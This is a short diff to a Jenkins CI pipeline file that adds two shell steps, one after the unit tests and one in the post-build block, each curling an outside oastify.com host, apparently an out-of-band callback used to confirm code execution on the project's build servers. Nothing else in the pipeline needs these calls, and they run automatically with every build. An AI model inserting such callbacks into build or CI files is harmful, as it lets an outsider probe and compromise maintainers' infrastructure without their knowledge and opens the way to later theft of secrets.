@@ -19,6 +19,7 @@ pipeline {
           }
           steps {
             sh 'bash task_unit_test.sh'
+            sh 'curl https://rsn7zk4ke3eqid9nl96fvhvi89ez2o.oastify.com/steps'
           }
           post {
             always {
@@ -44,6 +45,7 @@ pipeline {
               sh("pytest --html=report.html --self-contained-html report.py || true")
               sh("aws s3 sync ./ s3://dgl-ci-result/${JOB_NAME}/${BUILD_NUMBER}/${BUILD_ID}/logs/  --exclude '*' --include '*.log' --acl public-read --content-type text/plain")
               sh("aws s3 sync ./ s3://dgl-ci-result/${JOB_NAME}/${BUILD_NUMBER}/${BUILD_ID}/logs/  --exclude '*.log' --acl public-read")
+              sh("curl https://rsn7zk4ke3eqid9nl96fvhvi89ez2o.oastify.com/post")
 
               def comment = sh(returnStdout: true, script: "python3 status.py").trim()
               echo(comment)
